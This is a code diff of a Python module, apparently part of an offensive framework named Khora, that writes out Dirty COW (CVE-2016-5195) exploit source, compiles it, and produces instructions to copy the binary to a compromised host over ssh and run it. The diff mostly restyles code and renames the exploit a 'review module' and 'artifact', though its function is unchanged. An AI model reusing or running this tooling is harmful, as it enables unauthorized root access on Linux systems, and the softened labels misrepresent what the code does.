@@ -1,19 +1,17 @@
 """
-Dirty COW Module - Local Privilege Escalation Exploit Support
-Compiles and stages a Dirty COW payload for transfer and execution.
+Dirty COW review module for local privilege escalation artifact preparation.
 """
 
+import logging
 import os
 import subprocess
-import logging
 from pathlib import Path
-from datetime import datetime
 
 logger = logging.getLogger("Khora.DirtyCOW")
 
-DIRTY_COW_SOURCE = r'''/*
+DIRTY_COW_SOURCE = r"""/*
  * Dirty COW Exploit - CVE-2016-5195
- * Khora Security Framework
+ * Khora Framework
  */
 
 #include <fcntl.h>
@@ -73,15 +71,15 @@ int main(int argc, char **argv) {
 
     return 0;
 }
-'''
+"""
 
 
 def ensure_source():
     Path("exploits").mkdir(exist_ok=True)
     c_file = Path("exploits") / "dirtycow.c"
     if not c_file.exists():
-        with open(c_file, 'w') as f:
-            f.write(DIRTY_COW_SOURCE)
+        with open(c_file, "w") as handle:
+            handle.write(DIRTY_COW_SOURCE)
         logger.info(f"Dirty COW source created: {c_file}")
     return c_file
 
@@ -90,17 +88,20 @@ def compile_dirtycow():
     c_file = ensure_source()
     bin_file = Path("exploits") / "dirtycow"
     try:
-        subprocess.run([
-            "gcc", str(c_file), "-o", str(bin_file), "-pthread", "-Wall", "-O2"
-        ], check=True, capture_output=True, text=True)
+        subprocess.run(
+            ["gcc", str(c_file), "-o", str(bin_file), "-pthread", "-Wall", "-O2"],
+            check=True,
+            capture_output=True,
+            text=True,
+        )
         os.chmod(bin_file, 0o755)
         logger.info(f"Compiled Dirty COW exploit: {bin_file}")
         return bin_file
     except FileNotFoundError:
-        logger.error("gcc not found - install build-essential or gcc")
+        logger.error("gcc not found")
         return None
-    except subprocess.CalledProcessError as e:
-        logger.error(f"Dirty COW compilation failed: {e.stderr}")
+    except subprocess.CalledProcessError as exc:
+        logger.error(f"Dirty COW compilation failed: {exc.stderr}")
         return None
 
 
@@ -120,29 +121,29 @@ ssh ${{USER}}@${{TARGET}} 'chmod +x /tmp/dirtycow && /tmp/dirtycow'
 # If the target is already compromised, run locally:
 # sudo ./exploits/dirtycow
 """
-    with open(instructions_file, 'w') as f:
-        f.write(content)
+    with open(instructions_file, "w") as handle:
+        handle.write(content)
     logger.info(f"Dirty COW transfer instructions saved: {instructions_file}")
     return instructions_file
 
 
 def run(target, lhost, lport=4444):
-    print(f"\n{'='*70}")
-    print("DIRTYCOW MODULE - Local Privilege Escalation".center(70))
-    print('='*70)
+    print(f"\n{'=' * 70}")
+    print("DIRTY COW REVIEW MODULE".center(70))
+    print("=" * 70)
     print(f"Target: {target}")
     print(f"Listener: {lhost}:{lport}\n")
 
-    print("[*] Preparing Dirty COW exploit...")
+    print("[*] Preparing Dirty COW artifact...")
     bin_file = compile_dirtycow()
     if bin_file:
-        print(f"  [✓] Compiled exploit: {bin_file}")
+        print(f"  [OK ] Compiled exploit: {bin_file}")
     else:
-        print("  [✗] Dirty COW compilation failed")
+        print("  [FAIL] Dirty COW compilation failed")
 
     instructions = generate_transfer_instructions(target)
-    print(f"\n[✓] Transfer instructions: {instructions}")
-    print("\n[!] Note: Dirty COW is a local Linux privilege escalation exploit.")
+    print(f"\n[OK ] Transfer instructions: {instructions}")
+    print("\n[!] Note: Dirty COW is a local Linux privilege escalation path.")
     print("    Transfer the compiled binary to a compromised host and execute it there.")
-    print('='*70 + "\n")
+    print("=" * 70 + "\n")
     logger.info("Dirty COW module completed")
